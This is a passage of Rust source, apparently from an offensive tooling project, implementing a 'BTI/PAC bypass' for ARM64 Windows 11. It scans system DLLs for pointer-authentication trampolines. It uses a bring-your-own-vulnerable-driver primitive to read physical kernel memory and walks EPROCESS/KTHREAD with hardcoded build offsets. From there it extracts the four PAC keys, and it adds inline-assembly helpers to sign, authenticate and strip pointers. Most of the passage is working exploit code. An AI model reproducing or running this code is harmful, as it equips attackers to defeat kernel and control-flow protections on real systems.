                // BLR xN = 1101 0110 0011 1111 0000 11 Rn ---- ----
                // Mask for BLR: 0xFFFFFC1F, base: 0xD63F0000
                if (insn & 0xFFFFFC1F) == 0xD63F0000 {
                    found_blr = true;
                    blr_offset = (j * 4) as u32;
                    blr_reg = ((insn >> 5) & 0x1F) as u8;
                }
            }

            if found_blr && found_autiasp_ret {
                trampolines.push(PacTrampoline {
                    address: func_start as u64,
                    indirect_reg: blr_reg,
                    source_dll: dll_name,
                    blr_offset,
                });

                // Skip ahead past this function to avoid overlapping matches.
                // Typical ARM64 function is at least 16 instructions.
                // The outer loop will increment by 4, so we adjust by
                // returning here and letting the outer loop advance.
                if trampolines.len() >= 64 {
                    return;
                }
            }
        }

        break; // Only scan .text
    }
}

/// Get the PAC trampolines found during discovery.
pub fn pac_trampolines() -> &'static [PacTrampoline] {
    PAC_TRAMPOLINES.get().map(|t| t.as_slice()).unwrap_or(&[])
}

// ── PAC Key Extraction via BYOVD ─────────────────────────────────────────

#[cfg(feature = "kernel-callback")]
mod key_extraction {
    use super::*;

    /// Extracted PAC keys from the kernel.
    #[derive(Debug, Default)]
    struct PacKeys {
        /// APIAKey (128 bits, stored as two u64 halves).
        apia_key_lo: u64,
        apia_key_hi: u64,
        /// APIBKey (128 bits).
        apib_key_lo: u64,
        apib_key_hi: u64,
        /// APDAKey (128 bits).
        apda_key_lo: u64,
        apda_key_hi: u64,
        /// APDBKey (128 bits).
        apdb_key_lo: u64,
        apdb_key_hi: u64,
    }

    static EXTRACTED_KEYS: OnceLock<PacKeys> = OnceLock::new();

    // ── ARM64 EPROCESS / KTHREAD offsets for thread discovery ──────────
    //
    // To locate a KTHREAD we walk EPROCESS.ThreadListHead, which is a
    // LIST_ENTRY linking to KTHREAD.ThreadListEntry entries.
    //
    // Offsets are ARM64-specific and verified against public PDB symbols.
    // Each entry is (minimum_build, offset).

    /// ARM64 `_EPROCESS.ThreadListHead` offset.
    const EPROCESS_THREAD_LIST_HEAD_OFFSETS: &[(u32, usize)] = &[
        // Windows 11 21H2 ARM64 — same layout as 22H2.
        (22000, 0x780),
        // Windows 11 22H2 ARM64
        (22621, 0x780),
        // Windows 11 23H2 ARM64 — same layout as 22H2.
        (22631, 0x780),
        // Windows 11 24H2 ARM64 — EPROCESS grew by 8 bytes.
        (26100, 0x788),
        // Windows 11 24H2 cumulative ARM64 — same as base 24H2.
        (26120, 0x788),
    ];

    /// ARM64 `_KTHREAD.ThreadListEntry` offset (the LIST_ENTRY inside
    /// KTHREAD that is chained into EPROCESS.ThreadListHead).
    const KTHREAD_THREAD_LIST_ENTRY_OFFSETS: &[(u32, usize)] = &[
        // Windows 11 21H2 ARM64 — same layout as 22H2.
        (22000, 0x778),
        // Windows 11 22H2 ARM64
        (22621, 0x778),
        // Windows 11 23H2 ARM64 — same layout as 22H2.
        (22631, 0x778),
        // Windows 11 24H2 ARM64 — KTHREAD grew by 8 bytes.
        (26100, 0x780),
        // Windows 11 24H2 cumulative ARM64 — same as base 24H2.
        (26120, 0x780),
    ];

    // Each PAC key is 128 bits = 16 bytes.  The four keys are laid out
    // sequentially in KTHREAD:
    //   ApiAKey  @ key_offset     (16 bytes)
    //   ApiBKey  @ key_offset+16  (16 bytes)
    //   ApdAKey  @ key_offset+32  (16 bytes)
    //   ApdBKey  @ key_offset+48  (16 bytes)
    const PAC_KEY_SIZE: usize = 16;
    const PAC_KEY_COUNT: usize = 4;
    const PAC_KEYS_TOTAL: usize = PAC_KEY_SIZE * PAC_KEY_COUNT; // 64 bytes

    /// Attempt to extract PAC keys from the kernel via BYOVD.
    ///
    /// Strategy:
    /// 1. Resolve `PsInitialSystemProcess` → `_EPROCESS` pointer.
    /// 2. Walk `EPROCESS.ThreadListHead` → first `_KTHREAD`.
    /// 3. Read the 4 × 128-bit PAC keys from KTHREAD at the build-specific
    ///    offset.
    /// 4. Store the keys in `EXTRACTED_KEYS` for later use by
    ///    `sign_pointer_with_pacia`.
    ///
    /// Returns `true` if keys were successfully extracted.
    pub(super) fn attempt_key_extraction() -> bool {
        let build = CACHED_BUILD.get().copied().unwrap_or(0);

        // Look up all required offsets for this build.
        let key_offset_from_table = pac_key_offset_for_build(build);

        let thread_list_head_off = match eprocess_thread_list_head_offset(build) {
            Some(o) => o,
            None => {
                tracing::warn!(
                    "bti_pac_bypass: no EPROCESS.ThreadListHead offset for build {}",
                    build
                );
                return false;
            }
        };

        let kthread_list_entry_off = match kthread_thread_list_entry_offset(build) {
            Some(o) => o,
            None => {
                tracing::warn!(
                    "bti_pac_bypass: no KTHREAD.ThreadListEntry offset for build {}",
                    build
                );
                return false;
            }
        };

        // Get the deployed driver.
        let deployed = match crate::kernel_callback::deploy::get_deployed_driver() {
            Some(d) => d,
            None => {
                tracing::warn!("bti_pac_bypass: no deployed driver for PAC key extraction");
                return false;
            }
        };

        let driver = deployed.driver;
        let device_handle = match deployed.device_handle {
            Some(h) => h,
            None => {
                tracing::warn!("bti_pac_bypass: no device handle for PAC key extraction");
                return false;
            }
        };

        // ── Step 1: Resolve kernel base ────────────────────────────
        let kernel_base = match crate::kernel_callback::discover::get_kernel_base() {
            Ok(b) => b,
            Err(e) => {
                tracing::warn!("bti_pac_bypass: failed to get kernel base: {}", e);
                return false;
            }
        };

        // ── Step 2: Resolve PsInitialSystemProcess → EPROCESS ──────
        let eprocess_ptr_addr = match crate::kernel_callback::discover::resolve_kernel_symbol(
            driver,
            device_handle,
            kernel_base,
            "PsInitialSystemProcess",
        ) {
            Ok(addr) => addr,
            Err(e) => {
                tracing::warn!(
                    "bti_pac_bypass: failed to resolve PsInitialSystemProcess: {}",
                    e
                );
                return false;
            }
        };

        // Read the EPROCESS pointer.
        let mut eprocess_buf = [0u8; 8];
        if unsafe {
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                eprocess_ptr_addr,
                &mut eprocess_buf,
            )
        }
        .is_err()
        {
            tracing::warn!("bti_pac_bypass: failed to read PsInitialSystemProcess pointer");
            return false;
        }
        let eprocess_addr = u64::from_le_bytes(eprocess_buf);
        if eprocess_addr == 0 {
            tracing::warn!("bti_pac_bypass: PsInitialSystemProcess is NULL");
            return false;
        }

        // ── Step 3: Walk EPROCESS.ThreadListHead → first KTHREAD ───
        //
        // ThreadListHead is a LIST_ENTRY (two pointers: Flink, Blink).
        // Flink points to the ThreadListEntry inside the first KTHREAD.
        let mut list_buf = [0u8; 16]; // LIST_ENTRY = Flink + Blink
        if unsafe {
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                eprocess_addr + thread_list_head_off as u64,
                &mut list_buf,
            )
        }
        .is_err()
        {
            tracing::warn!(
                "bti_pac_bypass: failed to read EPROCESS.ThreadListHead at offset 0x{:X}",
                thread_list_head_off
            );
            return false;
        }
        let flink = u64::from_le_bytes(list_buf[0..8].try_into().unwrap());

        if flink == 0 {
            tracing::warn!("bti_pac_bypass: EPROCESS.ThreadListHead.Flink is NULL — no threads?");
            return false;
        }

        // Flink points to KTHREAD.ThreadListEntry.  Subtract the
        // ThreadListEntry offset to get the KTHREAD base address.
        let kthread_addr = if flink >= kthread_list_entry_off as u64 {
            flink - kthread_list_entry_off as u64
        } else {
            tracing::warn!(
                "bti_pac_bypass: Flink 0x{:X} < ThreadListEntry offset 0x{:X} — invalid",
                flink,
                kthread_list_entry_off
            );
            return false;
        };

        // Sanity: the KTHREAD address should be a kernel-space pointer.
        if kthread_addr < 0xFFFF8000_00000000 {
            tracing::warn!(
                "bti_pac_bypass: computed KTHREAD 0x{:X} is not in kernel VA space",
                kthread_addr
            );
            // Continue anyway — some configurations may differ.
        }

        // ── Step 4: Determine PAC key offset and read all 4 keys ────
        //
        // If the build is in the hardcoded table, use the known offset.
        // Otherwise, probe candidate offsets at runtime.
        let key_offset = match key_offset_from_table {
            Some(off) => off,
            None => {
                // Unknown build — probe for the correct offset at runtime.
                match probe_pac_key_offset(driver, device_handle, kthread_addr, build) {
                    Some(off) => off,
                    None => {
                        tracing::warn!(
                            "bti_pac_bypass: runtime probing failed for build {}",
                            build
                        );
                        return false;
                    }
                }
            }
        };

        let mut keys_buf = [0u8; PAC_KEYS_TOTAL];
        if unsafe {
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                kthread_addr + key_offset as u64,
                &mut keys_buf,
            )
        }
        .is_err()
        {
            tracing::warn!(
                "bti_pac_bypass: failed to read PAC keys from KTHREAD 0x{:X} at offset 0x{:X}",
                kthread_addr,
                key_offset
            );
            return false;
        }

        // ── Step 5: Parse the 4 × 128-bit keys ────────────────────
        let keys = PacKeys {
            // APIAKey: bytes 0..15
            apia_key_lo: u64::from_le_bytes(keys_buf[0..8].try_into().unwrap()),
            apia_key_hi: u64::from_le_bytes(keys_buf[8..16].try_into().unwrap()),
            // APIBKey: bytes 16..31
            apib_key_lo: u64::from_le_bytes(keys_buf[16..24].try_into().unwrap()),
            apib_key_hi: u64::from_le_bytes(keys_buf[24..32].try_into().unwrap()),
            // APDAKey: bytes 32..47
            apda_key_lo: u64::from_le_bytes(keys_buf[32..40].try_into().unwrap()),
            apda_key_hi: u64::from_le_bytes(keys_buf[40..48].try_into().unwrap()),
            // APDBKey: bytes 48..63
            apdb_key_lo: u64::from_le_bytes(keys_buf[48..56].try_into().unwrap()),
            apdb_key_hi: u64::from_le_bytes(keys_buf[56..64].try_into().unwrap()),
        };

        // Validate the extracted keys with heuristic checks.
        // Even for known-build offsets, validation catches cases where the
        // kernel version differs from the PDB used to derive the offset.
        if !validate_pac_keys(&keys_buf) {
            tracing::warn!(
                "bti_pac_bypass: extracted PAC keys failed validation — \
                 likely wrong KTHREAD or offset (KTHREAD=0x{:X}, offset=0x{:X})",
                kthread_addr,
                key_offset
            );

            // If the table lookup gave us the offset, try probing as a fallback.
            // This handles cases where the hardcoded offset is stale.
            if key_offset_from_table.is_some() {
                tracing::info!(
                    "bti_pac_bypass: table offset 0x{:X} failed validation, attempting probing fallback",
                    key_offset
                );
                if let Some(probed_offset) =
                    probe_pac_key_offset(driver, device_handle, kthread_addr, build)
                {
                    // Re-read with the probed offset.
                    let mut probed_buf = [0u8; PAC_KEYS_TOTAL];
                    if unsafe {
                        crate::kernel_callback::deploy::read_physical_memory(
                            driver,
                            device_handle,
                            kthread_addr + probed_offset as u64,
                            &mut probed_buf,
                        )
                    }
                    .is_ok()
                        && validate_pac_keys(&probed_buf)
                    {
                        tracing::info!(
                            "bti_pac_bypass: probing fallback succeeded at offset 0x{:X}",
                            probed_offset
                        );
                        // Reparse with the corrected offset.
                        let _ = EXTRACTED_KEYS.set(PacKeys {
                            apia_key_lo: u64::from_le_bytes(probed_buf[0..8].try_into().unwrap()),
                            apia_key_hi: u64::from_le_bytes(probed_buf[8..16].try_into().unwrap()),
                            apib_key_lo: u64::from_le_bytes(probed_buf[16..24].try_into().unwrap()),
                            apib_key_hi: u64::from_le_bytes(probed_buf[24..32].try_into().unwrap()),
                            apda_key_lo: u64::from_le_bytes(probed_buf[32..40].try_into().unwrap()),
                            apda_key_hi: u64::from_le_bytes(probed_buf[40..48].try_into().unwrap()),
                            apdb_key_lo: u64::from_le_bytes(probed_buf[48..56].try_into().unwrap()),
                            apdb_key_hi: u64::from_le_bytes(probed_buf[56..64].try_into().unwrap()),
                        });
                        return true;
                    }
                }
            }
            return false;
        }

        // ── Step 6: Store the extracted keys ───────────────────────
        match EXTRACTED_KEYS.set(keys) {
            Ok(()) => {
                tracing::info!(
                    "bti_pac_bypass: successfully extracted PAC keys from KTHREAD 0x{:X} \
                     (build={}, offset=0x{:X})",
                    kthread_addr,
                    build,
                    key_offset
                );
                true
            }
            Err(_) => {
                // Already set — this is fine, keys don't change.
                tracing::debug!("bti_pac_bypass: PAC keys already extracted");
                true
            }
        }
    }

    /// Look up the PAC key offset for a given Windows build.
    ///
    /// If the build is in the hardcoded table, returns the known offset.
    /// Otherwise, falls back to runtime probing of candidate offsets.
    fn pac_key_offset_for_build(build: u32) -> Option<usize> {
        // Try the exact table first.
        let mut best: Option<usize> = None;
        for &(b, off) in PAC_KEY_OFFSETS {
            if b <= build {
                best = Some(off);
            } else {
                break;
            }
        }
        if best.is_some() {
            return best;
        }

        // Unknown build — log a warning.  The caller will attempt probing
        // via `probe_pac_key_offset` which reads candidate offsets from the
        // kernel and validates them.
        tracing::warn!(
            "bti_pac_bypass: build {} not in PAC_KEY_OFFSETS table; \
             will attempt runtime probing",
            build
        );
        None
    }

    /// Probe for the PAC key offset by reading candidate memory ranges
    /// from a KTHREAD and validating the extracted data.
    ///
    /// Strategy:
    /// 1. Take the nearest known offset from the table as a base.
    /// 2. Scan ±64 bytes around that base in 8-byte-aligned steps.
    /// 3. For each candidate, read 64 bytes (4 × 128-bit keys) and
    ///    run heuristic validation.
    /// 4. Return the first candidate that passes all checks.
    ///
    /// Heuristic validation:
    /// - Keys must not be all-zero (likely wrong memory).
    /// - The 4 keys must not be identical (PAC uses distinct keys).
    /// - At least APIAKey should have non-trivial entropy (>32 bits set).
    fn probe_pac_key_offset(
        driver: usize,
        device_handle: usize,
        kthread_addr: u64,
        build: u32,
    ) -> Option<usize> {
        // Find the nearest known build's offset as a starting point.
        let base_offset = PAC_KEY_OFFSETS
            .iter()
            .rev() // Start from newest known build.
            .find(|&&(b, _)| b <= build)
            .map(|&(_, off)| off)
            .or_else(|| {
                // No known build at all — use a reasonable default from
                // public ARM64 KTHREAD layout analysis.  ApiAKey is typically
                // in the 0x300–0x400 range on ARM64 Windows 11.
                Some(0x380)
            })?;

        tracing::info!(
            "bti_pac_bypass: probing PAC key offsets around base 0x{:X} \
             for build {}",
            base_offset,
            build
        );

        // Scan ±64 bytes (9 candidate offsets) in 8-byte aligned steps.
        let probe_range: Vec<i32> = vec![
            -64, -56, -48, -40, -32, -24, -16, -8, 0, 8, 16, 24, 32, 40, 48, 56, 64,
        ];

        for delta in &probe_range {
            let candidate = (base_offset as i64 + *delta as i64) as usize;
            // Align to 8 bytes.
            let candidate = candidate & !7;

            let mut keys_buf = [0u8; PAC_KEYS_TOTAL];
            let read_result = unsafe {
                crate::kernel_callback::deploy::read_physical_memory(
                    driver,
                    device_handle,
                    kthread_addr + candidate as u64,
                    &mut keys_buf,
                )
            };

            if read_result.is_err() {
                continue;
            }

            if validate_pac_keys(&keys_buf) {
                tracing::info!(
                    "bti_pac_bypass: probing found valid PAC keys at offset 0x{:X} \
                     (base=0x{:X}, delta={:+})",
                    candidate,
                    base_offset,
                    delta
                );
                return Some(candidate);
            }
        }

        tracing::warn!(
            "bti_pac_bypass: probing failed — no candidate offset produced valid PAC keys"
        );
        None
    }

    /// Validate a 64-byte buffer as plausible PAC keys.
    ///
    /// Checks:
    /// 1. Not all zero.
    /// 2. Not all identical (4 keys should be distinct).
    /// 3. APIAKey has reasonable entropy (> 16 bits set in each half).
    fn validate_pac_keys(buf: &[u8; PAC_KEYS_TOTAL]) -> bool {
        // Check 1: Not all zero.
        if buf.iter().all(|&b| b == 0) {
            return false;
        }

        // Parse the 4 keys.
        let apia_lo = u64::from_le_bytes(buf[0..8].try_into().unwrap());
        let apia_hi = u64::from_le_bytes(buf[8..16].try_into().unwrap());
        let apib_lo = u64::from_le_bytes(buf[16..24].try_into().unwrap());
        let apib_hi = u64::from_le_bytes(buf[24..32].try_into().unwrap());
        let apda_lo = u64::from_le_bytes(buf[32..40].try_into().unwrap());
        let apda_hi = u64::from_le_bytes(buf[40..48].try_into().unwrap());
        let apdb_lo = u64::from_le_bytes(buf[48..56].try_into().unwrap());
        let apdb_hi = u64::from_le_bytes(buf[56..64].try_into().unwrap());

        // Check 2: The 4 keys should not be identical.
        let keys = [
            (apia_lo, apia_hi),
            (apib_lo, apib_hi),
            (apda_lo, apda_hi),
            (apdb_lo, apdb_hi),
        ];
        let all_same = keys.windows(2).all(|w| w[0] == w[1]);
        if all_same {
            return false;
        }

        // Check 3: APIAKey should have non-trivial entropy.  A real key
        // will have bits spread across both halves.  We require at least
        // 8 bits set in each half — this rejects structures that are
        // mostly zero with a few flag bits set (e.g., KTHREAD fields
        // near the PAC key region).
        let apia_lo_popcount = apia_lo.count_ones();
        let apia_hi_popcount = apia_hi.count_ones();
        if apia_lo_popcount < 8 || apia_hi_popcount < 8 {
            return false;
        }

        true
    }

    /// Look up the ARM64 `_EPROCESS.ThreadListHead` offset for a build.
    fn eprocess_thread_list_head_offset(build: u32) -> Option<usize> {
        let mut best: Option<usize> = None;
        for &(b, off) in EPROCESS_THREAD_LIST_HEAD_OFFSETS {
            if b <= build {
                best = Some(off);
            } else {
                break;
            }
        }
        best
    }

    /// Look up the ARM64 `_KTHREAD.ThreadListEntry` offset for a build.
    fn kthread_thread_list_entry_offset(build: u32) -> Option<usize> {
        let mut best: Option<usize> = None;
        for &(b, off) in KTHREAD_THREAD_LIST_ENTRY_OFFSETS {
            if b <= build {
                best = Some(off);
            } else {
                break;
            }
        }
        best
    }
}

#[cfg(feature = "kernel-callback")]
use key_extraction::attempt_key_extraction;

// ── Pointer Signing ──────────────────────────────────────────────────────

/// Sign a pointer with PAC using inline assembly.
///
/// Uses the `PACIA` instruction to sign a pointer with APIAKey.
/// The context value is combined with the key during signing.
///
/// **IMPORTANT**: This only works if PAC keys have been extracted from
/// the kernel (via BYOVD).  If the keys are not loaded into the system
/// registers, `PACIA` will produce a meaningless signature that won't
/// pass `AUTIA` verification.
///
/// # Safety
/// The caller must ensure that PAC is active and the keys are available.
#[inline(always)]
pub unsafe fn sign_pointer_with_pacia(ptr: usize, context: u64) -> usize {
    let mut signed_ptr = ptr;
    std::arch::asm!(
        "pacia {ptr}, {ctx}",
        ptr = inout(reg) signed_ptr,
        ctx = in(reg) context,
        options(nostack, nomem)
    );
    signed_ptr
}

/// Authenticate a PAC-signed pointer using inline assembly.
///
/// Uses the `AUTIA` instruction to verify the PAC signature.
/// If the signature is invalid, the PAC bits are corrupted and the
/// resulting pointer will fault on use.
///
/// # Safety
/// The caller must ensure the pointer was signed with APIAKey and the
/// same context value.
#[inline(always)]
pub unsafe fn auth_pointer_with_pacia(ptr: usize, context: u64) -> usize {
    let mut authed_ptr = ptr;
    std::arch::asm!(
        "autia {ptr}, {ctx}",
        ptr = inout(reg) authed_ptr,
        ctx = in(reg) context,
        options(nostack, nomem)
    );
    authed_ptr
}

/// Strip the PAC from a pointer without authentication.
///
/// Uses the `XPACI` instruction to remove the PAC bits from a pointer.
/// This produces the original pointer value regardless of whether the
/// PAC is valid.  Useful for extracting the raw pointer for comparison.
///
/// # Safety
/// The stripped pointer will not pass PAC verification if re-signed
/// without the correct key.
#[inline(always)]
pub unsafe fn strip_pac(ptr: usize) -> usize {
    let mut stripped = ptr;
    std::arch::asm!(
        "xpaci {ptr}",
        ptr = inout(reg) stripped,
        options(nostack, nomem)
    );
    stripped
}

// ── Logging ──────────────────────────────────────────────────────────────

fn log_pac_state() {
    let state = PAC_STATE.load(Ordering::SeqCst);
    let state_str = match state {
        PAC_INACTIVE => "inactive",
        PAC_ACTIVE_KEYS_AVAILABLE => "active (keys available via BYOVD)",
        PAC_ACTIVE_TRAMPOLINE_ONLY => "active (trampoline routing only)",
        PAC_ACTIVE_NO_BYPASS => "active (no bypass available)",
        _ => "unknown",
    };

    let trampolines = PAC_TRAMPOLINES.get().map(|t| t.len()).unwrap_or(0);
    let gadgets = BTI_GADGETS.get().map(|g| g.len()).unwrap_or(0);

    tracing::info!(
        "bti_pac_bypass: state={}, trampolines={}, bti_gadgets={}",
        state_str,
        trampolines,
        gadgets,
    );

    if state != PAC_INACTIVE {
        tracing::info!(
            "bti_pac_bypass: NOTE — PAC is cryptographically stronger than \
             Intel CET.  Direct PAC bypass (forging signatures) is not feasible \
             without the 128-bit keys stored in system registers.  Available \
             bypass strategies depend on kernel access (BYOVD) and trampoline \
             routing quality."
        );
    }
}
